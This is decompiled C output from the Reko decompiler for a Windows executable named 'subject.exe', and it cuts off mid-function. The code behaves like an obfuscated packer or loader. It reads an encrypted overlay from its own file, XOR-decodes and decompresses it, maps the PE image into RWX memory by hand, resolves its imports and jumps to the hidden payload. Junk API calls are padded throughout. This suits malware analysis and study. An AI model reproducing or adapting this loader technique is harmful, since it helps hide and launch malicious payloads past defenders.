// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 00401000: void fn00401000(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00401000(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	Mem20[0x004040E0:word32] = Mem0[0x004040E0:word32] << 0x55;
	Mem23[0x004040E0:word32] = Mem20[0x004040D8:word32];
	CopyRect(fp - 0x3C, fp - 44);
	word32 dwLoc0C_39 = 0x00;
	while (dwLoc0C_39 < dwArg0C)
	{
		Mem68[dwArg04 + dwLoc0C_39:byte] = Mem23[dwArg08 + dwLoc0C_39:byte];
		dwLoc0C_39 = dwLoc0C_39 + 0x01;
	}
}

// 004010C0: void fn004010C0(Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn004010C0(word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	Mem10[0x004040C0:word32] = Mem0[0x004040E0:word32] >> ~0x45;
	Mem14[0x004040E0:word32] = dwLoc30;
	word32 eax_20 = GetDesktopWindow();
	GetTextFaceA(GetDC(eax_20), eax_20, 0xFF);
	if (true)
		Mem245[0x004040E0:word32] = dwLoc30 >> (byte) Mem14[0x004040C0:word32];
	if (dwArg0C >=u 0x01)
	{
		byte dl_74 = Mem14[dwArg04 + 0x00:byte];
		word32 dwLoc0C_114 = 0x01;
		word32 dwLoc1C_110 = 0x00;
		do
		{
			word32 edx_92 = dwLoc0C_114 + 0x01;
			byte cl_89 = Mem14[dwArg04 + dwLoc0C_114:byte];
			dwLoc0C_114 = edx_92;
			word32 eax_97 = Mem14[0x004040FC:word32] << (byte) Mem14[0x004040EC:word32];
			if ((word32) cl_89 == (word32) dl_74)
			{
				if ((word32) Mem14[dwArg04 + edx_92:byte] == 0x00)
				{
					Mem143[dwArg08 + dwLoc1C_110:byte] = dl_74;
					Mem154[0x004040FC:word32] = Mem143[0x004040EC:word32] << (byte) (dwLoc10 * 0x02) >> 0x25;
					dwLoc1C_110 = dwLoc1C_110 + 0x01;
					dwLoc0C_114 = edx_92 + 0x01;
				}
				else
				{
					Mem161[0x004040FC:word32] = Mem14[0x004040EC:word32] *s 0x000BF8FD;
					word32 eax_172 = fn004012B0(fp - 0x14, dwArg04 + edx_92) + edx_92;
					Mem177[0x004040FC:word32] = Mem161[0x004040EC:word32] + eax_97 + dwLoc10;
					dwLoc0C_114 = fn004012B0(fp - 44, dwArg04 + eax_172) + eax_172;
					word32 dwLoc20_191 = 0x00;
					while (dwLoc20_191 <u dwLoc14)
					{
						Mem217[dwArg08 + dwLoc1C_110:byte] = Mem177[dwArg08 + (dwLoc1C_110 - dwLoc2C):byte];
						dwLoc1C_110 = dwLoc1C_110 + 0x01;
						dwLoc20_191 = dwLoc20_191 + 0x01;
					}
				}
			}
			else
			{
				Mem229[dwArg08 + dwLoc1C_110:byte] = cl_89;
				dwLoc1C_110 = dwLoc1C_110 + 0x01;
			}
		} while (dwLoc0C_114 <u dwArg0C);
	}
}

// 004012B0: Register word32 fn004012B0(Stack word32 dwArg04, Stack word32 dwArg08)
word32 fn004012B0(word32 dwArg04, word32 dwArg08)
{
	word32 dwLoc0C_13 = 0x00;
	word32 dwLoc28_15 = 0x00;
	do
	{
		word32 ecx_18 = (word32) Mem0[dwArg08 + 0x00:byte];
		Mem26[0x004040EC:word32] = Mem0[0x004040C4:word32] *s dwLoc2C;
		word32 ecx_31 = dwLoc0C_13 << 0x07 | ecx_18 & 0x7F;
		word32 ecx_38 = dwLoc28_15 + 0x01;
		dwArg08 = dwArg08 + 0x01;
		dwLoc0C_13 = ecx_31;
		dwLoc28_15 = ecx_38;
	} while ((ecx_18 & 0x80) != 0x00);
	Mem48[dwArg04 + 0x00:word32] = ecx_31;
	return ecx_38;
}

// 00401330: Register word32 fn00401330(Stack word32 dwArg04)
word32 fn00401330(word32 dwArg04)
{
	word32 eax_36;
	word32 eax_29 = CreateFileA(dwArg04, 0x80000000, 0x01, 0x00, 0x03, 0x80, 0x00);
	if (eax_29 == ~0x00)
		eax_36 = 0x00;
	else
		eax_36 = eax_29;
	return eax_36;
}

// 00401390: void fn00401390(Stack word32 dwArg04, Stack byte bArg08, Stack word32 dwArg0C)
void fn00401390(word32 dwArg04, byte bArg08, word32 dwArg0C)
{
	Mem9[0x004040C4:word32] = LoadBitmapW;
	word32 dwLoc0C_10 = 0x00;
	while (dwLoc0C_10 < dwArg0C)
	{
		Mem27[dwArg04 + dwLoc0C_10:byte] = bArg08;
		dwLoc0C_10 = dwLoc0C_10 + 0x01;
	}
}

// 004013E0: Register DWORD Win32CrtStartup()
DWORD Win32CrtStartup()
{
	word32 edx_22 = 0x000E116E >> (byte) ((Mem0[0x004040EC:word32] + 0x0001C55A) + Mem0[0x004040C4:word32]);
	Mem25[0x004040EC:word32] = GetMonitorInfoW;
	Mem27[0x004040FC:word32] = GetMenuItemInfoW;
	Mem34[0x004040FC:word32] = 0x000D24CD - edx_22;
	GetModuleHandleA(0x00);
	Mem47[0x004040FC:word32] = Mem34[0x004040FC:word32] << (byte) Mem34[0x004040FC:word32] << (byte) Mem34[0x004040FC:word32];
	LoadIconA(GetModuleHandleA(0x00), 0x00);
	LoadCursorA(0x00, 0x7F00);
	Mem67[0x004040C4:word32] = Mem47[0x004040EC:word32] *s dwLoc24 + 0x00029170;
	Mem73[0x004040FC:word32] = Mem67[0x004040C4:word32] + ~0x000AD87F + edx_22 >> 0x7C;
	Mem75[0x004040FC:word32] = 721557;
	Mem82[0x004040FC:word32] = 666473 << (byte) dwLoc0C;
	word32 eax_86 = DPB(fp - 188, RegisterClassA(fp - 188), 0);
	if (dwArg08 != 0x01)
		Mem752[0x004040E8:word32] = 0x00;
	else
	{
		Mem753[0x004040E8:word32] = 0x01;
		Mem755[0x004040D0:word32] = dwArg04;
	}
	word32 dwLoc30_130;
	CreateWindowExA(0x00, 0x00404044, 0x00404034, 0x01, 340340, 2302297, 808, 0x6873, 0x00, 0x00, GetModuleHandleA(0x00), 0x00);
	Mem120[0x004040FC:word32] = LoadAcceleratorsW;
	word32 esp_115 = fp - 0x0148;
	if (Mem120[0x004040E8:word32] == 0x00)
	{
		esp_115 = fp - 332;
		dwLoc30_130 = GetModuleHandleA(0x00);
	}
	else
		dwLoc30_130 = dwArg04;
	Mem143[0x004040E0:word32] = Mem120[0x004040BC:word32];
	word32 esp_145 = esp_115 - 0x04;
	Mem146[esp_145 + 0x00:word32] = fp - 0xCC;
	Mem149[esp_145 - 0x04 + 0x00:word32] = fp - 220;
	CopyRect(Mem149[esp_145 - 0x04 + 0x00:LPRECT], Mem149[esp_145 + 0x00:(ptr RECT)]);
	Mem151[0x004040C8:word32] = 0x00;
	Mem155[0x004040FC:word32] = CharUpperW;
	word32 ecx_165 = dwLoc30_130 + Mem155[dwLoc30_130 + 0x3C:word32];
	Mem169[esp_145 - 0x08 + 0x00:word32] = 0x44;
	Mem171[esp_145 - 0x0C + 0x00:word32] = 0x00;
	Mem174[esp_145 - 0x10 + 0x00:word32] = fp - 0x7C;
	fn00401390(dwArg00, bArg04, dwArg08);
	Mem189[esp_145 - 0x08 + 0x00:word32] = fp - 0x7C;
	GetStartupInfoA(Mem189[esp_145 - 0x08 + 0x00:LPSTARTUPINFOA]);
	Mem191[0x004040EC:word32] = EnumThreadWindows;
	if (false)
	{
		Mem273[0x004040C4:word32] = 988983 - Mem191[0x004040FC:word32] - dwLoc0C + Mem191[0x004040C4:word32];
		Mem274[0x004040BC:word32] = 0x00166D1E;
		Mem276[esp_145 - 0x0C + 0x00:word32] = 0x00404068;
		Mem278[esp_145 - 0x10 + 0x00:word32] = 0x00;
		word32 esp_277 = esp_145 - 0x10;
		word32 eax_279 = LoadCursorA(Mem278[esp_145 - 0x10 + 0x00:HINSTANCE], Mem278[esp_145 - 0x0C + 0x00:LPCSTR]);
		if (eax_279 != 0x00)
		{
			Mem741[esp_145 - 0x14 + 0x00:word32] = eax_279;
			SetCursor(Mem741[esp_145 - 0x14 + 0x00:HCURSOR]);
			esp_277 = esp_145 - 0x14;
		}
		Mem292[0x004040EC:word32] = MoveWindow;
		word32 eax_302 = ((word32) Mem292[ecx_165 + 0x06:word16] - 0x01) *s 0x28 + ((ecx_165 + 0x18) + (word32) Mem292[ecx_165 + 0x14:word16]);
		word32 eax_318 = (uint32) ((uint64) (uint32) (Mem292[eax_302 + 0x10:word32] - 0x01 + Mem292[ecx_165 + 0x3C:word32]) /u Mem292[ecx_165 + 0x3C:word32]) *s Mem292[ecx_165 + 0x3C:word32] + Mem292[eax_302 + 0x14:word32];
		Mem322[0x004040FC:word32] = EnumDisplaySettingsExA;
		word32 esp_323 = esp_277 - 0x04;
		Mem324[esp_323 + 0x00:word32] = 0x0200;
		word32 dwLoc28_284 = 2255859;
		word32 eax_325 = fn00402690(dwArg00);
		if (eax_325 != 0x00)
		{
			Mem335[0x004040C4:word32] = IsClipboardFormatAvailable;
			Mem337[esp_323 + 0x00:word32] = 0x0200;
			Mem340[esp_323 - 0x04 + 0x00:word32] = eax_325;
			Mem343[esp_323 - 0x08 + 0x00:word32] = dwLoc30_130;
			GetModuleFileNameA(Mem343[esp_323 - 0x08 + 0x00:HMODULE], Mem343[esp_323 - 0x04 + 0x00:LPSTR], Mem343[esp_323 + 0x00:DWORD]);
			Mem347[0x004040BC:word32] = 4287546642;
			Mem349[esp_323 - 0x0C + 0x00:word32] = 0x00404090;
			Mem351[esp_323 - 0x10 + 0x00:word32] = 0x00;
			word32 esp_350 = esp_323 - 0x10;
			word32 eax_352 = LoadCursorA(Mem351[esp_323 - 0x10 + 0x00:HINSTANCE], Mem351[esp_323 - 0x0C + 0x00:LPCSTR]);
			if (eax_352 != 0x00)
			{
				Mem727[esp_323 - 0x14 + 0x00:word32] = eax_352;
				SetCursor(Mem727[esp_323 - 0x14 + 0x00:HCURSOR]);
				esp_350 = esp_323 - 0x14;
				dwLoc28_284 = 6303100;
			}
			Mem363[0x004040BC:word32] = dwLoc28_284 *s dwLoc28_284 << (byte) dwLoc28_284;
			word32 esp_372 = esp_350 - 0x04;
			Mem373[esp_372 + 0x00:word32] = eax_325;
			word32 eax_374 = fn00401330(dwArg00);
			if (eax_374 != 0x00)
			{
				word32 edx_388 = Mem373[0x004040FC:word32] >> (byte) (Mem373[0x004040C4:word32] *s 0x0001F3F6 + 464538);
				Mem391[0x004040FC:word32] = ToAsciiEx;
				Mem393[esp_372 + 0x00:word32] = 0x00;
				Mem396[esp_372 - 0x04 + 0x00:word32] = eax_374;
				word32 eax_398 = GetFileSize(Mem396[esp_372 - 0x04 + 0x00:HANDLE], Mem396[esp_372 + 0x00:LPDWORD]) - eax_318;
				Mem403[0x004040EC:word32] = BroadcastSystemMessageW;
				if (eax_398 != 0x00)
				{
					Mem412[esp_372 - 0x08 + 0x00:word32] = eax_398 + 0x10;
					word32 eax_413 = fn00402690(dwArg00);
					if (eax_413 != 0x00)
					{
						Mem429[esp_372 - 0x08 + 0x00:word32] = 0x00;
						Mem431[esp_372 - 0x0C + 0x00:word32] = 0x00;
						Mem434[esp_372 - 0x10 + 0x00:word32] = eax_318;
						Mem437[esp_372 - 0x14 + 0x00:word32] = eax_374;
						SetFilePointer(Mem437[esp_372 - 0x14 + 0x00:HANDLE], Mem437[esp_372 - 0x10 + 0x00:LONG], Mem437[esp_372 - 0x0C + 0x00:PLONG], Mem437[esp_372 - 0x08 + 0x00:DWORD]);
						Mem440[esp_372 - 0x18 + 0x00:word32] = 0x00;
						Mem443[esp_372 - 0x1C + 0x00:word32] = fp - 0x84;
						Mem446[esp_372 - 0x20 + 0x00:word32] = eax_398;
						Mem449[esp_372 - 0x24 + 0x00:word32] = eax_413;
						Mem452[esp_372 - 0x28 + 0x00:word32] = eax_374;
						if (ReadFile(Mem452[esp_372 - 0x28 + 0x00:HANDLE], Mem452[esp_372 - 0x24 + 0x00:LPVOID], Mem452[esp_372 - 0x20 + 0x00:DWORD], Mem452[esp_372 - 0x1C + 0x00:LPDWORD], Mem452[esp_372 - 0x18 + 0x00:LPOVERLAPPED]) != 0x00 && dwLoc84 == eax_398)
						{
							Mem470[0x004040EC:word32] = SetMenuInfo;
							Mem479[0x004040FC:word32] = 0x0005A588 << (byte) edx_388 >> (byte) (Mem470[0x004040EC:word32] *s edx_388);
							Mem482[esp_372 - 44 + 0x00:word32] = eax_374;
							CloseHandle(Mem482[esp_372 - 44 + 0x00:HANDLE]);
							Mem485[0x004040C4:word32] = RegisterClassExA;
							if (dwLoc84 == eax_398)
							{
								Mem494[0x004040EC:word32] = SubtractRect;
								Mem496[esp_372 - 0x30 + 0x00:word32] = 0x40;
								Mem501[esp_372 - 0x34 + 0x00:word32] = eax_413 - 0x40 + eax_398;
								Mem504[esp_372 - 0x38 + 0x00:word32] = eax_413;
								fn00401000(dwArg00, dwArg04, dwArg08);
								Mem508[0x004040EC:word32] = GetMenuDefaultItem;
								Mem512[esp_372 - 0x30 + 0x00:word32] = 0x0015C561;
								word32 dwLoc28_510 = dwLoc28_284;
								if (GetBkColor(Mem512[esp_372 - 0x30 + 0x00:HDC]) == ~0x00)
								{
									Mem716[0x004040BC:word32] = Mem512[0x004040C8:word32] - 0x00505D23;
									dwLoc28_510 = dwLoc28_284 << (byte) (Mem716[0x004040E0:word32] + Mem716[0x004040D8:word32]);
								}
								Mem521[0x004040D8:word32] = dwLoc28_510 - Mem512[0x004040C8:word32] << ~0x79;
								word32 edx_523 = Mem521[eax_413 + 0x00:word32];
								Mem526[0x004040C4:word32] = EnumClipboardFormats;
								Mem529[0x004040D8:word32] = dwLoc28_510 *s 4383850;
								Mem531[esp_372 - 0x34 + 0x00:word32] = 0x9963;
								word32 edx_543 = Mem531[eax_413 + 0x04:word32];
								word32 dwLoc10_545 = 0x00;
								while (dwLoc10_545 <u edx_523)
								{
									Mem559[eax_413 + dwLoc10_545 + 0x08:word32] = Mem531[eax_413 + dwLoc10_545 + 0x08:word32] ^ 3322;
									dwLoc10_545 = dwLoc10_545 + 0x08;
								}
								Mem570[esp_372 - 0x38 + 0x00:word32] = edx_543;
								Mem573[0x004040E4:word32] = fn00402690(dwArg00);
								if (Mem573[0x004040E4:word32] != 0x00)
								{
									word32 esp_630;
									Mem580[esp_372 - 0x38 + 0x00:word32] = edx_523;
									Mem583[esp_372 - 0x3C + 0x00:word32] = Mem580[0x004040E4:word32];
									Mem588[esp_372 - 0x40 + 0x00:word32] = eax_413 + 0x08;
									fn004010C0(dwArg00, dwArg04, dwArg08);
									Mem592[esp_372 - 0x38 + 0x00:word32] = 0x00401B9A;
									word32 edx_596 = 0x000157CC << (byte) Mem592[0x004040C4:word32];
									word32 eax_598 = Mem592[esp_372 - 0x38 + 0x00:word32];
									Mem605[0x004040EC:word32] = Mem592[0x004040C4:word32] << (byte) Mem592[0x004040FC:word32];
									Mem608[0x004040F4:word32] = Mem605[fs:0x18:word32];
									Mem610[0x004040CC:word32] = edi;
									Mem611[0x004040B8:word32] = esi;
									Mem612[0x004040DC:word32] = ebx;
									Mem619[0x004040D4:word32] = fp - 0x04;
									Mem624[0x004040FC:word32] = dwLoc18 - 971343 - ((0x00 >> (byte) edx_596) >> ~0x22);
									if (Mem624[0x004040E8:word32] != 0x00)
									{
										Mem698[esp_372 - 0x38 + 0x00:word32] = eax_598 - Mem624[0x004040D0:word32];
										fn00401C70(fp - 0x04, dwArg00);
										esp_630 = esp_372 - 0x34;
									}
									else
									{
										Mem702[esp_372 - 0x38 + 0x00:word32] = 0x00;
										Mem708[esp_372 - 0x3C + 0x00:word32] = eax_598 - GetModuleHandleA(Mem702[(esp_372 - 0x38) + 0x00:LPCSTR]);
										fn00401C70(fp - 0x04, dwArg00);
										esp_630 = esp_372 - 0x38;
									}
									word32 esp_632 = esp_630 - 0x04;
									Mem633[esp_632 + 0x00:word32] = Mem624[0x004040E4:word32];
									if (fn00401F00(fp - 0x04, dwArg00) != 0x00)
									{
										Mem654[0x004040EC:word32] = Mem633[0x004040EC:word32] >> (byte) Mem633[(fp - 0x14) + 0x00:word32] >> (byte) Mem633[(fp - 0x18) + 0x00:word32];
										Mem658[0x004040FC:word32] = Mem654[0x004040C4:word32] - 585083;
										Mem662[0x004040FC:word32] = Mem658[fp - 0x0C + 0x00:word32] << ~0x36;
										word32 edx_668 = 0x0A7D << (byte) (Mem662[(fp - 0x14) + 0x00:word32] *s Mem662[(fp - 0x24) + 0x00:word32]);
										Mem669[0x004040FC:word32] = edx_668;
										word32 ecx_675 = Mem669[0x004040EC:word32];
										byte cl_676 = (byte) ecx_675;
										word32 eax_677 = Mem669[0x004040FC:word32] << (byte) Mem669[(fp - 0x0C) + 0x00:word32] >> cl_676;
										Mem679[fp - 0x18 + 0x00:word32] = eax_677;
										word32 esp_680;
										word32 ebp_681;
										byte SCZO_682;
										word32 ebx_683;
										word32 esi_684;
										word32 edi_685;
										word32 eax_686;
										word32 ecx_687;
										word32 edx_688;
										byte cl_689;
										byte Z_690;
										byte SZO_691;
										byte C_692;
										selector fs_693;
										Mem679[0x004040F8:word32]();
										return eax_686;
									}
									else
									{
										Mem641[esp_632 + 0x00:word32] = Mem633[0x004040E4:word32];
										fn00402650(dwArg00);
										Mem645[esp_632 + 0x00:word32] = 0x00582353;
										ExitProcess(Mem645[esp_632 + 0x00:UINT]);
									}
								}
								else
								{
									Mem577[esp_372 - 0x38 + 0x00:word32] = 0x01795716;
									ExitProcess(Mem577[esp_372 - 0x38 + 0x00:UINT]);
								}
							}
						}
					}
				}
			}
		}
	}
	return 0x00;
}

// 00401C70: void fn00401C70(Register word32 ebp, Stack word32 dwArg04)
void fn00401C70(word32 ebp, word32 dwArg04)
{
	word32 dwLoc3C_17;
	Mem11[0x004040EC:word32] = GetKeyboardLayout;
	Mem13[0x004040C4:word32] = LoadMenuIndirectW;
	word32 esp_20 = fp - 0x40;
	if (Mem13[0x004040E8:word32] != 0x00)
		dwLoc3C_17 = Mem13[0x004040D0:word32];
	else
	{
		esp_20 = fp - 0x44;
		dwLoc3C_17 = GetModuleHandleA(0x00);
	}
	if (dwLoc3C_17 != 0x00)
	{
		Mem74[0x004040C4:word32] = GetKeyboardType;
		Mem78[0x004040C4:word32] = Mem74[0x004040EC:word32] *s dwLoc2C *s 0x00059D4E;
		word32 eax_81 = dwLoc3C_17 + Mem78[dwLoc3C_17 + 0x3C:word32];
		word32 esp_83 = esp_20 - 0x04;
		Mem84[esp_83 + 0x00:word32] = 0x40;
		Mem86[esp_83 - 0x04 + 0x00:word32] = 0x3000;
		Mem90[esp_83 - 0x08 + 0x00:word32] = Mem86[eax_81 + 0x50:word32];
		Mem92[esp_83 - 0x0C + 0x00:word32] = 0x00;
		Mem94[0x004040F0:word32] = VirtualAlloc(Mem92[esp_83 - 0x0C + 0x00:LPVOID], Mem92[esp_83 - 0x08 + 0x00:SIZE_T], Mem92[esp_83 - 0x04 + 0x00:DWORD], Mem92[esp_83 + 0x00:DWORD]);
		if (Mem94[0x004040F0:word32] != 0x00)
		{
			Mem108[esp_83 - 0x10 + 0x00:word32] = Mem94[eax_81 + 0x50:word32];
			Mem111[esp_83 - 0x14 + 0x00:word32] = dwLoc3C_17;
			word32 ecx_112 = Mem111[0x004040F0:word32];
			Mem114[esp_83 - 0x18 + 0x00:word32] = ecx_112;
			fn00401000(dwArg00, dwArg04, dwArg08);
			word32 edx_120 = Mem114[0x004040F0:word32] - dwLoc3C_17;
			if (Mem114[eax_81 + 0xA4:word32] != 0x00)
			{
				word32 dwLoc14_157 = dwLoc3C_17 + Mem114[eax_81 + 0xA0:word32];
				while (Mem114[dwLoc14_157 + 0x04:word32] != 0x00)
				{
					word32 edx_181 = Mem114[dwLoc14_157 + 0x04:word32] - 0x08 >>u 0x01;
					word32 ecx_189 = dwLoc14_157 + 0x08;
					word32 dwLoc0C_196 = 0x00;
					while (dwLoc0C_196 <u edx_181)
					{
						if ((word32) ecx_189[dwLoc0C_196 * 0x02] >> 0x0C == 0x03)
							Mem246[Mem114[0x004040F0:word32] + Mem114[dwLoc14_157 + 0x00:word32] + ((word32) ecx_189[dwLoc0C_196 * 0x02] & 0x0FFF):word32] = Mem114[Mem114[0x004040F0:word32] + Mem114[dwLoc14_157 + 0x00:word32] + ((word32) ecx_189[dwLoc0C_196 * 0x02] & 0x0FFF):word32] + edx_120;
						dwLoc0C_196 = dwLoc0C_196 + 0x01;
					}
					dwLoc14_157 = dwLoc14_157 + Mem114[dwLoc14_157 + 0x04:word32];
				}
			}
			Mem135[esp_83 - 0x10 + 0x00:word32] = dwArg04;
			word32 eax_138 = Mem135[esp_83 - 0x10 + 0x00:word32] + Mem135[0x004040F0:word32];
			word32 esp_142;
			word32 ebp_143;
			byte SCZO_144;
			word32 esi_145;
			word32 eax_146;
			word32 ecx_147;
			byte Z_148;
			word32 edx_149;
			byte SZO_150;
			byte C_151;
			byte cl_152;
			eax_138();
		}
	}
}

// 00401F00: Register word32 fn00401F00(Register word32 ebp, Stack word32 dwArg04)
word32 fn00401F00(word32 ebp, word32 dwArg04)
{
	word32 eax_269;
	word32 edx_16 = dwArg04 + Mem0[dwArg04 + 0x3C:word32];
	word32 dwLoc2C_120 = edx_16 + 0x18 + (word32) Mem0[edx_16 + 0x14:word16];
	word32 eax_33 = VirtualAlloc(0x00, Mem0[edx_16 + 0x50:word32], 0x3000, 0x40);
	if (eax_33 == 0x00)
	{
		eax_269 = 0x00;
		return eax_269;
	}
	Mem96[0x004040C4:word32] = 0x00 << (byte) (dwLoc20 - Mem0[0x004040C4:word32]);
	fn00401000(eax_33, dwArg04, Mem96[dwArg04 + 0x3C:word32] + 0x0138 + (word32) Mem96[edx_16 + 0x06:word16] *s 0x28);
	word32 esp_112 = fp - 0x68;
	word32 dwLoc10_114 = 0x00;
	while (dwLoc10_114 <u (word32) Mem96[edx_16 + 0x06:word16])
	{
		Mem129[0x004040FC:word32] = 0x00;
		if (Mem129[dwLoc2C_120 + 0x14:word32] != 0x00 && Mem129[dwLoc2C_120 + 0x10:word32] != 0x00)
		{
			fn00401000(eax_33 + Mem129[dwLoc2C_120 + 0x0C:word32], dwArg04 + Mem129[dwLoc2C_120 + 0x14:word32], (uint32) ((uint64) (uint32) (Mem129[dwLoc2C_120 + 0x10:word32] - 0x01 + Mem129[edx_16 + 0x3C:word32]) /u Mem129[edx_16 + 0x3C:word32]) *s Mem129[edx_16 + 0x3C:word32]);
			esp_112 = fp - 0x68;
		}
		Mem142[0x004040FC:word32] = Mem129[0x004040FC:word32] *s dwLoc30;
		dwLoc2C_120 = dwLoc2C_120 + 0x28;
		dwLoc10_114 = dwLoc10_114 + 0x01;
	}
	word32 edx_186 = eax_33 + Mem96[eax_33 + 0x3C:word32];
	word32 dwLoc54_192 = eax_33 + Mem96[edx_186 + 0x80:word32];
	while (Mem96[dwLoc54_192 + 0x10:word32] != 0x00)
	{
		esp_112 = esp_112 - 0x04;
		Mem214[esp_112 + 0x00:word32] = eax_33 + Mem96[dwLoc54_192 + 0x0C:word32];
		word32 eax_215 = GetModuleHandleA(Mem214[esp_112 + 0x00:LPCSTR]);
		word32 dwLoc18_216 = eax_215;
		if (eax_215 == 0x00)
		{
			if (Mem214[0x004040E8:word32] != 0x00)
			{
				eax_269 = 0x00;
				return eax_269;
			}
			Mem344[esp_112 - 0x04 + 0x00:word32] = eax_33 + Mem214[dwLoc54_192 + 0x0C:word32];
			word32 eax_345 = LoadLibraryA(Mem344[esp_112 - 0x04 + 0x00:LPCSTR]);
			esp_112 = esp_112 - 0x04;
			dwLoc18_216 = eax_345;
			dwLoc20 = Mem344[0x004040C4:word32] *s 0x000E3550 *s dwLoc24;
			if (eax_345 == 0x00)
			{
				eax_269 = 0x00;
				return eax_269;
			}
		}
		word32 dwLoc40_233;
		word32 dwLoc28_232;
		dwLoc30 = Mem214[0x004040FC:word32] << (byte) (dwLoc24 + Mem214[0x004040EC:word32]);
		if (Mem214[dwLoc54_192 + 0x00:word32] != 0x00)
		{
			dwLoc28_232 = eax_33 + Mem214[dwLoc54_192 + 0x00:word32];
			dwLoc40_233 = eax_33 + Mem214[dwLoc54_192 + 0x10:word32];
		}
		else
		{
			dwLoc28_232 = eax_33 + Mem214[dwLoc54_192 + 0x10:word32];
			dwLoc40_233 = eax_33 + Mem214[dwLoc54_192 + 0x00:word32];
		}
		word32 dwLoc14_236 = 0x00;
		if (Mem214[dwLoc54_192 + 0x10:word32] != 0x00 && Mem214[dwLoc54_192 + 0x00:word32] != 0x00)
			dwLoc14_236 = 0x01;
		while (Mem214[dwLoc28_232 + 0x00:word32] != 0x00)
		{
			dwLoc30 = Mem214[0x004040C4:word32] - dwLoc20;
			if ((Mem214[dwLoc28_232 + 0x00:word32] & 0x80000000) != 0x00)
			{
				word32 esp_292 = esp_112 - 0x04;
				Mem293[esp_292 + 0x00:word32] = Mem214[dwLoc28_232 + 0x00:word32] & 0x7FFFFFFF;
				Mem296[esp_292 - 0x04 + 0x00:word32] = dwLoc18_216;
				Mem299[dwLoc28_232 + 0x00:word32] = GetProcAddress(Mem296[esp_292 - 0x04 + 0x00:HMODULE], Mem296[esp_292 + 0x00:LPCSTR]);
			}
			else
			{
				word32 esp_304 = esp_112 - 0x04;
				Mem305[esp_304 + 0x00:word32] = Mem214[dwLoc28_232 + 0x00:word32] + 0x02 + eax_33;
				Mem308[esp_304 - 0x04 + 0x00:word32] = dwLoc18_216;
				Mem311[dwLoc28_232 + 0x00:word32] = GetProcAddress(Mem308[esp_304 - 0x04 + 0x00:HMODULE], Mem308[esp_304 + 0x00:LPCSTR]);
			}
			esp_112 = esp_112 - 0x08;
			if (Mem214[dwLoc28_232 + 0x00:word32] == 0x00)
			{
				eax_269 = 0x00;
				return eax_269;
			}
			if (dwLoc14_236 != 0x00)
				Mem286[dwLoc40_233 + 0x00:word32] = Mem214[dwLoc28_232 + 0x00:word32];
			dwLoc28_232 = dwLoc28_232 + 0x04;
			dwLoc40_233 = dwLoc40_233 + 0x04;
		}
		dwLoc54_192 = dwLoc54_192 + 0x14;
	}
	if (Mem96[0x004040E8:word32] != 0x00)
	{
		word32 ecx_647 = Mem96[0x004040D0:word32] - Mem96[edx_186 + 0x34:word32];
		if (Mem96[edx_186 + 0xA4:word32] != 0x00)
		{
			word32 dwLoc1C_656 = eax_33 + Mem96[edx_186 + 0xA0:word32];
			while (Mem96[dwLoc1C_656 + 0x04:word32] != 0x00)
			{
				word32 ecx_672 = Mem96[dwLoc1C_656 + 0x04:word32] - 0x08 >>u 0x01;
				word32 edx_675 = dwLoc1C_656 + 0x08;
				word32 dwLoc10_678 = 0x00;
				while (dwLoc10_678 <u ecx_672)
				{
					dwLoc30 = 0x00;
					if ((word32) edx_675[dwLoc10_678 * 0x02] >> 0x0C == 0x03)
						Mem721[eax_33 + Mem96[dwLoc1C_656 + 0x00:word32] + ((word32) edx_675[dwLoc10_678 * 0x02] & 0x0FFF):word32] = Mem96[eax_33 + Mem96[dwLoc1C_656 + 0x00:word32] + ((word32) edx_675[dwLoc10_678 * 0x02] & 0x0FFF):word32] + ecx_647;
					dwLoc10_678 = dwLoc10_678 + 0x01;
				}
				dwLoc1C_656 = dwLoc1C_656 + Mem96[dwLoc1C_656 + 0x04:word32];
			}
		}
	}
	word32 esp_371 = esp_112 - 0x04;
	Mem372[esp_371 + 0x00:word32] = 0x00;
	Mem376[esp_371 - 0x04 + 0x00:word32] = Mem372[edx_186 + 0x50:word32];
	Mem378[esp_371 - 0x08 + 0x00:word32] = 0x00;
	Mem380[esp_371 - 0x0C + 0x00:word32] = 0x04;
	Mem382[esp_371 - 0x10 + 0x00:word32] = 0x00;
	Mem384[esp_371 - 0x14 + 0x00:word32] = ~0x00;
	word32 eax_385 = CreateFileMappingA(Mem384[esp_371 - 0x14 + 0x00:HANDLE], Mem384[esp_371 - 0x10 + 0x00:LPSECURITY_ATTRIBUTES], Mem384[esp_371 - 0x0C + 0x00:DWORD], Mem384[esp_371 - 0x08 + 0x00:DWORD], Mem384[esp_371 - 0x04 + 0x00:DWORD], Mem384[esp_371 + 0x00:LPCSTR]);
	if (eax_385 == 0x00)
	{
		eax_269 = 0x00;
		return eax_269;
	}
	Mem395[0x004040FC:word32] = dwLoc20 + 0x00073B70;
	if (Mem395[0x004040E8:word32] != 0x00)
	{
		Mem614[esp_371 - 0x18 + 0x00:word32] = Mem395[0x004040D0:word32];
		Mem616[esp_371 - 0x1C + 0x00:word32] = 0x00;
		Mem618[esp_371 - 0x20 + 0x00:word32] = 0x00;
		Mem620[esp_371 - 0x24 + 0x00:word32] = 0x00;
		Mem622[esp_371 - 0x28 + 0x00:word32] = 0x22;
		Mem625[esp_371 - 44 + 0x00:word32] = eax_385;
		Mem627[0x004040F0:word32] = MapViewOfFileEx(Mem625[esp_371 - 44 + 0x00:HANDLE], Mem625[esp_371 - 0x28 + 0x00:DWORD], Mem625[esp_371 - 0x24 + 0x00:DWORD], Mem625[esp_371 - 0x20 + 0x00:DWORD], Mem625[esp_371 - 0x1C + 0x00:SIZE_T], Mem625[esp_371 - 0x18 + 0x00:LPVOID]);
	}
	else
	{
		Mem631[esp_371 - 0x18 + 0x00:word32] = Mem395[edx_186 + 0x34:word32];
		Mem633[esp_371 - 0x1C + 0x00:word32] = 0x00;
		Mem635[esp_371 - 0x20 + 0x00:word32] = 0x00;
		Mem637[esp_371 - 0x24 + 0x00:word32] = 0x00;
		Mem639[esp_371 - 0x28 + 0x00:word32] = 0x22;
		Mem642[esp_371 - 44 + 0x00:word32] = eax_385;
